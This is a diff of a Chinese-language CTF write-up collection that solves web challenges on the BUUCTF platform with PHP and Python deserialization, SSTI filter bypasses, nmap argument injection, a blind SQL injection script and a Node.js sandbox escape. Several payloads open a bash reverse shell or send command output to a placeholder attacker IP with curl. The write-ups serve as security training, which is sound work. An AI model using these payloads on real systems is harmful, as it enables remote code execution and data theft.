@@ -43,7 +43,7 @@ select * from users where username=‘admin\‘ and password=‘or 1#‘;
 
 ## （忘记哪题了）
 
-```
+```php
 <?php
 
 include 'flag.php';
@@ -326,9 +326,42 @@ else{
 ?> 
 ```
 
-最终payload:http://917e65ad-dc18-4006-86eb-fa4995b954b7.node3.buuoj.cn/?text=php://input&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
+`file_get_contents`可以利用`php://input`绕过，然后要利用伪协议读取useless.php文件
+
+![](https://img.npfs06.top/20210307164311.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+base64解码后
+
+```php
+<?php  
+
+class Flag{  //flag.php  
+    public $file;  
+    public function __tostring(){  
+        if(isset($this->file)){  
+            echo file_get_contents($this->file); 
+            echo "<br>";
+        return ("U R SO CLOSE !///COME ON PLZ");
+        }  
+    }  
+}  
+?>  
+
+```
+
+很简单的反序列化
+
+最终payload
+
+```
+?text=php://input&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
 
 POST:welcome to the zjctf
+```
+
+
+
+![](https://img.npfs06.top/20210307164111.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
 
 ps:这里是file=useless.php而不是file=php://filter/convert.base64-encode/resource=useless.php
 因为我们要include的是这个页面，不是它的Base64化的源码
@@ -350,6 +383,123 @@ php://filter/convert.base64-encode/resource=useless.php的作用是读取useless
 
 ## [网鼎杯 2020 青龙组]AreUSerialz
 
+```php
+<?php
+
+include("flag.php");
+
+highlight_file(__FILE__);
+
+class FileHandler {
+
+    protected $op;
+    protected $filename;
+    protected $content;
+
+    function __construct() {
+        $op = "1";
+        $filename = "/tmp/tmpfile";
+        $content = "Hello World!";
+        $this->process();
+    }
+
+    public function process() {
+        if($this->op == "1") {
+            $this->write();
+        } else if($this->op == "2") {
+            $res = $this->read();
+            $this->output($res);
+        } else {
+            $this->output("Bad Hacker!");
+        }
+    }
+
+    private function write() {
+        if(isset($this->filename) && isset($this->content)) {
+            if(strlen((string)$this->content) > 100) {
+                $this->output("Too long!");
+                die();
+            }
+            $res = file_put_contents($this->filename, $this->content);
+            if($res) $this->output("Successful!");
+            else $this->output("Failed!");
+        } else {
+            $this->output("Failed!");
+        }
+    }
+
+    private function read() {
+        $res = "";
+        if(isset($this->filename)) {
+            $res = file_get_contents($this->filename);
+        }
+        return $res;
+    }
+
+    private function output($s) {
+        echo "[Result]: <br>";
+        echo $s;
+    }
+
+    function __destruct() {
+        if($this->op === "2")
+            $this->op = "1";
+        $this->content = "";
+        $this->process();
+    }
+
+}
+
+function is_valid($s) {
+    for($i = 0; $i < strlen($s); $i++)
+        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
+            return false;
+    return true;
+}
+
+if(isset($_GET{'str'})) {
+
+    $str = (string)$_GET['str'];
+    if(is_valid($str)) {
+        $obj = unserialize($str);
+    }
+
+}
+```
+
+需要绕过两个地方：
+
+1、is_valid()函数规定字符的ASCII码必须是32-125，而protected属性在序列化后会出现不可见字符\00*\00，转化为ASCII码不符合要求。
+
+绕过方法：
+
+①PHP7.1以上版本对属性类型不敏感，public属性序列化不会出现不可见字符，可以用public属性来绕过
+
+2、__destruct()魔术方法中，op==="2"是强比较，而process()使用的是弱比较op=="2"，可以通过弱类型绕过。
+
+绕过方法：op=2，这里的2是整数int类型，op=2时，op==="2"为false，op=="2"为true
+
+payload:
+
+```php
+<?php
+
+class FileHandler {
+
+    public $op = 2;
+    public  $filename = "flag.php";
+    public  $content = "aaa";
+}
+
+$a = new FileHandler();
+$b = serialize($a);
+echo $b;
+
+?>
+```
+
+在不知道flag.php文件路径的时候，可以通过读取系统配置文件、容器配置文件来猜flag的绝对路径。
+
 ```
 linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的信息。
 
@@ -364,12 +514,25 @@ cmdline 程序运行的绝对路径
 cpuset docker 环境可以看 machine ID
 
 cgroup docker环境下全是 machine ID 不太常用
-
 ```
 
 
 
 ## [BJDCTF2020]EasySearch
+
+源码.swp泄露，通过审计，
+
+```python
+import hashlib
+def md5(s):
+    return hashlib.md5(s.encode('utf-8')).hexdigest()
+for i in range(1, 10000000):
+    if md5(str(i)).startswith('6d0bc1'):
+        print(i)
+        break
+```
+
+爆破得到密码为2020666，先测试一下网站基本功能，用户名aaa，密码2020666登录进去，在network处获得文件路径（抓包也可以看到），文件后缀为shtml
 
 ssi注入
 
@@ -397,10 +560,64 @@ ssi注入
 1. **Nmap的文件读写操作**
 2. **escapeshellarg() + escapeshellcmd（）函数的使用**
 
-payload 1: 
+nmap的输出文件选项：
+
+- -oN 标准保存
+- -oX XML保存
+- -oG Grep保存
+- -oA 保存到所有格式
+- -append-output 补充保存文件
 
 ```php
-' -iL /flag -oN flag.txt '
+<?
+require('settings.php');
+ 
+ 
+set_time_limit(0);
+if (isset($_POST['host'])):
+	if (!defined('WEB_SCANS')) {
+        	die('Web scans disabled');
+	}
+ 
+	$host = $_POST['host'];
+	if(stripos($host,'php')!==false){
+		die("Hacker...");
+	}
+	$host = escapeshellarg($host);
+	$host = escapeshellcmd($host);
+ 
+	$filename = substr(md5(time() . rand(1, 10)), 0, 5);
+	$command = "nmap ". NMAP_ARGS . " -oX " . RESULTS_PATH . $filename . " " . $host;
+	$result_scan = shell_exec($command);
+	if (is_null($result_scan)) {
+		die('Something went wrong');
+	} else {
+		header('Location: result.php?f=' . $filename);
+	}
+else:
+?>
+```
+
+主要语句：
+
+```
+$command = "nmap ". NMAP_ARGS . " -oX " . RESULTS_PATH . $filename . " " . $host;
+$result_scan = shell_exec($command);
+```
+
+带入之后相当于：
+
+```
+$ nmap -Pn -T4 -F --host-timeout 1000ms -oX xml/$filename $host
+```
+
+**方法一：直接读flag写入文件**
+
+- -iL:从文件中加载目标
+- -oN:将扫描后的文件信息以“Normal”的形式输出存储
+
+```
+ ' -iL /flag -oN flag.txt '
 ```
 
 
@@ -409,7 +626,7 @@ payload 1:
 >
 >　-oN   把扫描结果重定向到一个可读的文件logfilename中。
 
-
+**方法二**
 
 payload 2 (单引号逃逸 类似 [BUUCTF 2018]Online Tool):
 [PHP-escapeshell-命令执行](https://www.anquanke.com/post/id/168093#h2-0)
@@ -6212,3 +6429,2485 @@ for i in range(1,100):
 
 print(flag)
 ```
+
+
+
+## [RoarCTF 2019]Online Proxy
+
+知识点：XFF二次注入
+
+wp网上很多师傅们都写得很详细了，再写主要是记录下赵师傅则是将字符转为数字直接输出的骚操作，效率高得多，贴出来学习一下
+
+```python
+import requests
+import time
+
+target = "http://node3.buuoj.cn:25488/"
+
+def execute_sql(sql):
+    print("[*]请求语句：" + sql)
+    return_result = ""
+
+    payload = "0'|length((" + sql + "))|'0"
+    print(payload)
+    session = requests.session()
+    r = session.get(target, headers={'X-Forwarded-For': payload})
+    r = session.get(target, headers={'X-Forwarded-For': 'glzjin'})
+    r = session.get(target, headers={'X-Forwarded-For': 'glzjin'})
+    start_pos = r.text.find("Last Ip: ")
+    end_pos = r.text.find(" -->", start_pos)
+    length = int(r.text[start_pos + 9: end_pos])
+    print("[+]长度：" + str(length))
+
+    for i in range(50, length + 1, 5):
+        time.sleep(2)
+        payload = "0'|conv(hex(substr((" + sql + ")," + str(i) + ",5)),16,10)|'0"
+        print(payload)
+
+        r = session.get(target, headers={'X-Forwarded-For': payload})
+        r = session.get(target, headers={'X-Forwarded-For': 'glzjin'})
+        r = session.get(target, headers={'X-Forwarded-For': 'glzjin'})
+        start_pos = r.text.find("Last Ip: ")
+        end_pos = r.text.find(" -->", start_pos)
+        result = int(r.text[start_pos + 9: end_pos])
+        print(result)
+        return_result += bytes.fromhex(hex(result)[2:]).decode('utf-8')
+
+
+        print("[+]位置 " + str(i) + " 请求五位成功:" + bytes.fromhex(hex(result)[2:]).decode('utf-8'))
+
+    return return_result
+
+
+# # 获取数据库
+# print("[+]获取成功：" + execute_sql("SELECT group_concat(SCHEMA_NAME) FROM information_schema.SCHEMATA"))
+#
+# # 获取数据库表
+# print("[+]获取成功：" + execute_sql("SELECT group_concat(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e'"))
+#
+# # 获取数据库表
+# print("[+]获取成功：" + execute_sql("SELECT group_concat(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = 'F4l9_D4t4B45e' AND TABLE_NAME = 'F4l9_t4b1e' "))
+
+# 获取表中内容
+print("[+]获取成功：" + execute_sql("SELECT group_concat(F4l9_C01uMn) FROM F4l9_D4t4B45e.F4l9_t4b1e"))
+```
+
+由于BUU 429的原因，`  for i in range(50, length + 1, 5):`这里范围可以修改下，脚本多跑几次可以得出flag
+
+
+
+## [watevrCTF-2019]Pickle Store
+
+知识点：python反序列化  <a href="https://xz.aliyun.com/t/7320">https://xz.aliyun.com/t/7320</a>
+
+
+
+看到题目名字，第一反应就是python反序列化
+
+进入环境，买黄瓜，对于这种购物类的web题，切入点一般在`cookie`，买黄瓜，抓包，cookie尝试base64解密。
+
+虽然有乱码，但是发现还是挺像点什么的。再结合题目中的“Pickle”，联想到Python反序列化。这cookie可能就是先经过Pickle序列化然后再进行base64加密的数据。
+
+我们编写如下脚本，将原始的cookie数据给反序列胡出来：
+
+```python
+import pickle
+import base64
+
+result = pickle.loads(base64.b64decode(b'gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu'))
+print(result)
+```
+
+得到：
+
+```
+PYTHON
+{'money': 500, 'history': [], 'anti_tamper_hmac': 'aa1ba4de55048cf20e0a7a63b7f8eb62'}
+
+```
+
+确实是我们所猜测的。
+
+那我们便可以将我们pickle反序列话的payload进行base64加密，然后放入到cookie中，当服务器再获取我们cookie并进行反序列化时，便会触发payload。
+
+编写如下POC进行反弹shell：
+
+```python
+import pickle
+import base64
+class A(object):
+    def __reduce__(self):
+        return (eval,("__import__('os').system('bash -c \"bash -i >& /dev/tcp/47.xxx.xx.xx/2333 0>&1\"')",))
+poc = A()
+result = pickle.dumps(poc)
+result = base64.b64encode(result)
+print(result)
+```
+
+得到伪造的cookie，将其设置为cookie的值，并且在本地开启监听，然后点击Buy：
+
+![](http://img.npfs06.top/20210224221309.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+
+
+## [GWCTF 2019]你的名字
+
+知识点：
+
+1. SSTI
+2. 黑名单过滤逻辑错误
+
+
+
+> 很详细的SSTI>>：<https://xz.aliyun.com/t/6885#toc-4>
+
+> SSTIbypass姿势>><https://p0sec.net/index.php/archives/120/>
+
+
+
+打开题目，只有一个输入框，尝试输入`{{7*7}}`，不管怎么改，返回的结果都是一样的，说明可能`{{}}`被过滤了；过滤的字符串给了个PHP的报错，还给了一个不存在的文件，又把路由设置了一个`index.php`
+
+**模板规则**
+
+> `{{...}}`装载一个变量，模板渲染的时候，会使用传进来的同名参数这个变量代表的值替换掉。
+> `{% ... %}`：装载一个控制语句。
+> `{# ... #}`：装载一个注释，模板渲染的时候会忽视这中间的值。
+
+**但是可以通过 `{%%}` 类似的方式来进行注入，尝试 `{%if 1%}1{% endif%}`** ，发现服务器直接给出500错误。。。判断可能有什么过滤
+
+直接输入if，返回结果是：
+
+```
+hello ! 
+
+```
+
+说明if被替换为空了，尝试双写iiff，但是还是被替换为空了，可能是用的循环匹配。
+
+说明if被替换为空了，尝试双写iiff，但是还是被替换为空了，可能是用的循环匹配。
+
+参考了师傅写的wp，fuzz出来的过滤可能是这个样子：
+
+```python
+blacklist = ['import', 'getattr', 'os', 'class', 'subclasses', 'mro', 'request', 'args', 'eval',
+                 'if', 'for',' subprocess', 'file', 'open', 'popen', 'builtins', 'compile',
+                 'execfile', 'from_pyfile', 'local','self', 'item', 'getitem', 'getattribute', 
+                 'func_globals', 'config']
+for no in blacklist:
+    while True:
+        if no in s:
+            s = s.replace(no, '')
+        else:
+            break
+return s
+```
+
+考察黑名单过滤逻辑错误，这种过滤，利用黑名单中最后一个词进行混淆来过滤是最好了，即 `if=>iconfigf` ，因为是用黑名单的关键词按顺序来对输入进行替换的，那么最后一个 `config` 被替换之后，过滤也就结束了。
+
+```
+{% if ''.__class__.__mro__[2];.__subclasses__()[59];.__init__.func_globals.linecache.os.popen('curl http://yourip:port/ -d ls / | grep flag;') %}1{% endif %}
+#相当于把ls的结果进行base64编码后（不然只能显示一行），以curl的方式发送到攻击机
+
+
+```
+
+nc监听即可
+
+
+
+## [RCTF 2019]Nextphp
+
+知识点：PHP7.4特性FFI
+
+```php
+<?php
+if (isset($_GET['a'])) {
+    eval($_GET['a']);
+} else {
+    show_source(__FILE__);
+}
+123456
+```
+
+尝试利用eval
+
+```
+?a=echo system("ls");
+
+```
+
+报错，system()函数被禁止了
+
+尝试查看phpinfo();
+
+```
+?a=phpinfo();
+
+```
+
+查看成功,
+
+```
+收集一波phpinfo的信息
+
+disable_functions	set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl
+
+open_basedir	/var/www/html
+
+opcache.preload	/var/www/html/preload.php
+
+FFI
+FFI support	enabled
+disable_classes	ReflectionClass	ReflectionClass
+
+```
+
+接下来使用其中没有过滤的函数进行渗透:
+
+```
+?a=echo var_dump(scandir("/var/www/html/"));
+
+```
+
+返回结果如下:
+
+```
+  array(4) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(9) "index.php" [3]=> string(11) "preload.php" }
+
+```
+
+查看preload.php的内容:
+
+```
+/?a=show_source("/var/www/html/preload.php");
+
+```
+
+得到如下代码:
+
+```php
+<?php
+final class A implements Serializable {
+    protected $data = [
+        'ret' => null,
+        'func' => 'print_r',
+        'arg' => '1'
+    ];
+
+    private function run () {
+        $this->data['ret'] = $this->data['func']($this->data['arg']);
+    }
+
+    public function __serialize(): array {
+        return $this->data;
+    }
+
+    public function __unserialize(array $data) {
+        array_merge($this->data, $data);
+        $this->run();
+    }
+
+    public function serialize (): string {
+        return serialize($this->data);
+    }
+
+    public function unserialize($payload) {
+        $this->data = unserialize($payload);
+        $this->run();
+    }
+
+    public function __get ($key) {
+        return $this->data[$key];
+    }
+
+    public function __set ($key, $value) {
+        throw new \Exception('No implemented');
+    }
+
+    public function __construct () {
+        throw new \Exception('No implemented');
+    }
+}
+
+```
+
+里面定义了一个可以反序列化执行任意函数的类,利用下面的脚本生成一个序列化对象:
+
+```php
+<?php
+final class A implements Serializable {
+    protected $data = [
+        'ret' => null,
+        'func' => 'print_r',
+        'arg' => '666'
+    ];
+
+    private function run () {
+        $this->data['ret'] = $this->data['func']($this->data['arg']);
+    }
+
+    public function __serialize(): array {
+        return $this->data;
+    }
+
+    public function __unserialize(array $data) {
+        array_merge($this->data, $data);
+        $this->run();
+    }
+
+    public function serialize (): string {
+        return serialize($this->data);
+    }
+
+    public function unserialize($payload) {
+        $this->data = unserialize($payload);
+        $this->run();
+    }
+
+    public function __get ($key) {
+        return $this->data[$key];
+    }
+
+    public function __set ($key, $value) {
+        
+    }
+
+    public function __construct () {
+       
+    }
+}
+$A = new A();
+var_dump(serialize($A))
+?>
+
+```
+
+```
+string(76) "C:1:"A":63:{a:3:{s:3:"ret";N;s:4:"func";s:7:"print_r";s:3:"arg";s:3:"666";}}"
+
+```
+
+传参:
+
+```
+?a=var_dump(unserialize(%27C:1:"A":63:{a:3:{s:3:"ret";N;s:4:"func";s:7:"print_r";s:3:"arg";s:3:"666";}}%27)->__get("ret"));
+
+```
+
+返回结果如下
+
+> 666bool(true)
+
+成功用函数print_r打印出666
+
+该题我们利用FFI扩展
+
+FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。
+FFI的使用非常简单，只用声明和调用两步就可以，对于有C语言经验，但是不了解Zend引擎的程序员来说，这简直是打开了新世界的大门，可以快速地使用C类库进行原型试验。
+php样例如下：
+
+```php
+<?php
+// create FFI object, loading libc and exporting function printf()
+$ffi = FFI::cdef(
+    "int printf(const char *format, ...);", // this is a regular C declaration
+    "libc.so.6");
+// call C's printf()
+$ffi->printf("Hello %s!\n", "world");
+?>
+```
+
+可以发现FFI，可以直接调用底层c的函数执行命令，我们搜索一下：
+printf对应的申明：
+[![img](https://skysec.top/images/2019-05-18-21-30-01.png)](https://skysec.top/images/2019-05-18-21-30-01.png)
+那么搜索system对应的申明:
+[![img](https://skysec.top/images/2019-05-18-21-29-41.png)](https://skysec.top/images/2019-05-18-21-29-41.png)
+
+将官方样例改写：
+
+```php
+<?php
+$ffi = FFI::cdef("int system (const char* command);");
+$ffi->system("ls");
+?>
+```
+
+利用序列化触发，构造序列化为：
+
+```php
+➜ cat 1.php
+<?php
+final class A implements Serializable {
+    protected $data = [
+        'ret' => null,
+        'func' => 'FFI::cdef',
+        'arg' => "int system (const char* command);"
+    ];
+
+    public function serialize (): string {
+        return serialize($this->data);
+    }
+
+    public function unserialize($payload) {
+        $this->data = unserialize($payload);
+        $this->run();
+    }
+}
+
+$a = new A;
+echo serialize($a);
+```
+
+得到序列化:
+
+```
+C:1:"A":96:{a:3:{s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:33:"int system (const char* command);";}}
+
+```
+
+尝试执行命令:
+
+```
+?a=$a=unserialize('C:1:"A":96:{a:3:{s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:33:"int system (const char* command);";}}');var_dump($a->ret->system('ls'));
+
+```
+
+
+
+直接执行命令只返回`int(1792)`等，于是考虑用盲打，为了防止特殊字符，我们使用了Base64：
+
+```
+?a=$a=unserialize('C:1:"A":96:{a:3:{s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:33:"int system (const char* command);";}}');var_dump($a->ret->system('curl ip:23333/`ls / | base64`'));
+
+```
+
+nc连接即可
+
+
+
+## [watevrCTF-2019]Supercalc
+
+知识点：
+
+1. 利用（#）注释符进行SSTI
+2. session伪造
+
+一个类似计算机的功能，在输入框，尝试输入`1+1`：
+
+返回数字2
+
+输入：`{{7*7}}`
+
+页面回显You cant use ast.Set m8
+
+输入： `1/0`
+
+页面报错
+
+![](http://img.npfs06.top/20210226230906.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+说明程序对报错应该没有做过滤，这里学到了新姿势，尝试输入`#(注释)`：`1/0#{{7*7}}`：
+
+可以发现被正确解析了，我们读取下config文件，可以发现存在SECRET_KEY,考虑session伪造
+
+![](http://img.npfs06.top/20210226225850.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+将cookie解密下
+
+![](http://img.npfs06.top/20210226231307.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+可以发现是提交历史，那么接下去就可以伪造cookie了
+
+![](http://img.npfs06.top/20210226231507.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+
+
+![](http://img.npfs06.top/20210226230314.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+
+
+## [Black Watch 入群题]Web2
+
+知识点：
+
+1. group by with rollup
+2. mysql任意文件读取
+
+1、with rollup：
+with rollup关键字会在所有记录的最后加上一条记录，该记录是上面所有记录的总和。
+2、group_concat():
+group by与group_concat()函数一起使用时，每个分组中指定字段值都显示出来
+
+```mysql
+ mysql> select sex,group_concat(name) from employee group by sex;   
++------+------------------+    
+| sex  |group_concat(name)|    
++------+------------------+    
+| 女   | 李四              |    
+| 男   | 张三,王五，Aric    |      
++------+------------------+    
+2 rows in set (0.00 sec)  
+```
+
+例1、普通的 GROUP BY 操作，可以按照部门和职位进行分组，计算每个部门，每个职位的工资平均值：
+
+```mysql
+mysql> select dep,pos,avg(sal) from employee group by dep,pos;  
++------+------+-----------+  
+| dep  | pos  | avg(sal)  |  
++------+------+-----------+  
+| 01   | 01   | 1500.0000 |  
+| 01   | 02   | 1950.0000 |  
+| 02   | 01   | 1500.0000 |  
+| 02   | 02   | 2450.0000 |  
+| 03   | 01   | 2500.0000 |  
+| 03   | 02   | 2550.0000 |  
++------+------+-----------+  
+6 rows in set (0.02 sec)  
+```
+
+例2、如果我们希望显示部门的平均值和全部雇员的平均值，普通的 GROUP BY 语句是不能实现的，需要另外执行一个查询操作，或者通过程序来计算。如果使用有 WITH ROLLUP 子句的 GROUP BY 语句，则可以轻松实现这个要求：
+
+```mysql
+mysql> select dep,pos,avg(sal) from employee group by dep,pos with rollup;  
++------+------+-----------+  
+| dep  | pos  | avg(sal)  |  
++------+------+-----------+  
+| 01   | 01   | 1500.0000 |  
+| 01   | 02   | 1950.0000 |  
+| 01   | NULL | 1725.0000 |  
+| 02   | 01   | 1500.0000 |  
+| 02   | 02   | 2450.0000 |  
+| 02   | NULL | 2133.3333 |  
+| 03   | 01   | 2500.0000 |  
+| 03   | 02   | 2550.0000 |  
+| 03   | NULL | 2533.3333 |  
+| NULL | NULL | 2090.0000 |  
++------+------+-----------+  
+10 rows in set (0.00 sec) 
+```
+
+
+
+## [pasecactf_2019]flask_ssti
+
+知识点：SSTI
+
+很常规的SSTI过滤绕过题，fuzz下，过滤了`.` , `_` , `'`
+
+```
+单引号用双引号替换
+下划线用hex编码/5F替换
+点号用\x2E替换
+例：
+{{''.__class__.__mro__[2]}}
+{{()["\5F\5Fclass\5F\5F"]["\5F\5Fmore\5F\5F"][2]}}
+
+```
+
+
+
+```
+{{()["__class__"]["__bases__"][0]["__subclasses__"]()[80]["load_module"]("os")["system"]("ls")}}
+//用<class '_frozen_importlib.BuiltinImporter'>这个去执行命令
+
+{{()["__class__"]["__bases__"][0]["__subclasses__"]()[91]["get_data"](0, "app.py")}}
+//用<class '_frozen_importlib_external.FileLoader'>这个去读取文件
+
+```
+
+
+
+payload1:
+
+```
+{{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")}}
+
+```
+
+
+
+payload2:
+
+```
+//直接读app.py文件，然后根据文件中的算法逆推flag
+{{()["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fmro\x5f\x5f"][1]["\x5f\x5fsubclasses\x5f\x5f"]()[127]["\x5f\x5finit\x5f\x5f"]["\x5f\x5fglobals\x5f\x5f"]["popen"]("cat%20app\x2epy")["read"]()}}
+
+```
+
+
+
+## [NPUCTF2020]验证🐎
+
+知识点：
+
+1. JavaScript中的类型比较
+2. 原型链污染
+
+```js
+const express = require('express');	//引入express模块
+const bodyParser = require('body-parser');
+const cookieSession = require('cookie-session');
+
+const fs = require('fs');
+const crypto = require('crypto');
+
+const keys = require('./key.js').keys;
+
+function md5(s) {
+  return crypto.createHash('md5')
+    .update(s)
+    .digest('hex');
+}
+
+function saferEval(str) {
+  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&|^%<>=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, '')) {
+    return null;
+  }
+  return eval(str);
+} // 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个
+
+//使用readFileSync(同步读取文件方法)读取index.html
+const template = fs.readFileSync('./index.html').toString();
+function render(results) {
+  return template.replace('{{results}}', results.join('<br/>'));
+}
+
+const app = express();	//实例化一个express
+//bodyParser.urlencoded用来解析request中body的urlencoded字符，只支持utf-8的编码的字符,也支持自动的解析gzip和zlib。
+//返回的对象是一个键值对，当extended为false的时候，键值对中的值就为'String'或'Array'形式，为true的时候，则可为任何数据类型。
+app.use(bodyParser.urlencoded({ extended: false }));
+//将文本解析为JSON
+app.use(bodyParser.json());
+
+app.use(cookieSession({
+  name: 'PHPSESSION', // 2020.3/WORKER2 嘿嘿，给👴爪⑧
+  keys
+}));
+//冻结Object和Math，表明这俩不可被修改
+Object.freeze(Object);
+Object.freeze(Math);
+//接收POST数据
+app.post('/', function (req, res) {
+  let result = '';
+  const results = req.session.results || [];
+  const { e, first, second } = req.body;
+  if (first && second && first.length===second.length && first!==second && md5(first+keys[0])===md5(second+keys[0])) {
+    if (req.body.e) {
+      try {
+        result = saferEval(req.body.e) || 'Wrong Wrong Wrong!!!';
+      } catch (e) {
+        console.log(e);
+        result = 'Wrong Wrong Wrong!!!';
+      }
+      //unshift()：向数组的开头添加一个或更多元素，并返回新数组的长度。该方法会改变原数组。
+      results.unshift(`${req.body.e}=${result}`);
+    }
+  } else {
+    results.unshift('Not verified!');
+  }
+  if (results.length > 13) {
+  	//pop()：把数组的最后一个元素从其中删除，并返回最后一个元素的值。该方法会改变原数组。
+    results.pop();
+  }
+  req.session.results = results;
+  res.send(render(req.session.results));
+});
+
+// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
+app.get('/source', function (req, res) {
+  res.set('Content-Type', 'text/javascript;charset=utf-8');
+  res.send(fs.readFileSync('./index.js'));
+});
+
+app.get('/', function (req, res) {
+  res.set('Content-Type', 'text/html;charset=utf-8');
+  req.session.admin = req.session.admin || 0;
+  res.send(render(req.session.results = req.session.results || []))
+});
+
+app.listen(80, '0.0.0.0', () => {
+  console.log('Start listening')
+});
+
+```
+
+这里有几个概念需要先讲一下
+
+
+
+![](https://img.npfs06.top/20210228230309.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+对于JavaScript中的类型比较：数组`[1]==1`在两个等于号时候是返回true的，而在三个等于号时候会返回false。这一点是和php一样的。
+
+JavaScript中各个数据类型的相加：node中任何数据类型和字符串相加最后得到的都是字符串
+
+而长度`length` 属性对于字符串是返回字符串长度，而数组是返回数组元素个数。而数字是没有`length` 的。
+
+------
+
+我们来看题目，需要绕过两层
+
+### hash绕过
+
+要满足`first && second && first.length === second.length && first!==second && md5(first+keys[0]) === md5(second+keys[0])` 结合上面的结论我们我们想要`first` 和`second` 长度一样而他们内容又不相等，但是他们md5加盐后的值又要相等。可以构造如下payload：
+
+```
+{"e":payload,"first":[0],"second":"0"}
+
+```
+
+```
+
+```
+
+这是因为数组利用了**任何数据类型加上字符串都会转变称为字符串的特性**。同时数组和字符串的长度都是1但是他们却不全等。
+
+### 构造函数执行任意代码
+
+题目关键代码：
+
+```js
+function saferEval(str) {
+  if (str.replace(/(?:Math(?:\.\w+)?)|[()+\-*/&|^%<>=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g, '')) {
+    return null;
+  }
+  return eval(str);
+}
+```
+
+因为可以使用`Math.随便什么单词`，所以可以获取到`Math.__proto__`，但这姿势无法直接利用。但是经过尝试，发现`Arrow Function` 是可以使用的，尝试构造这种链：
+
+```
+((Math)=>(Math=Math.__proto__,Math=Math.__proto__))(Math)
+// Math.__proto__.__proto__
+
+```
+
+然后尝试调用eval或者Function，但是此处无法直接输入字符串，故使用`String.fromCharCode(...)`。
+
+然后使用
+
+```javascript
+Math+1 // '[object Math]1'
+```
+
+从原型链上导出String和Function
+
+```
+((Math)=>(Math=Math.constructor,Math.constructor(Math.fromCharCode(...))))(Math+1)()
+
+// 等价于
+const s = Math+1;					// '[object Math]1'
+const a = s.constructor;			// String
+const e = a.fromCharCode(...);		// ascii to string
+const f = a.constructor;			// Function
+f(e)(); // 调用
+
+
+```
+
+最终要构造的是
+
+```
+(Math=>(
+		Math=Math.constructor,
+		Math.x=Math.constructor(
+			Math.fromCharCode({encode("return process.mainModule.require('child_process').execSync('cat /flag')")})
+		)()
+	))(Math+1)
+
+
+```
+
+`Math=>` 是什么意思？我们来看个简单的例子：
+
+![](https://img.npfs06.top/20210228231505.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)
+
+`x => x * x` 相当于：
+
+```
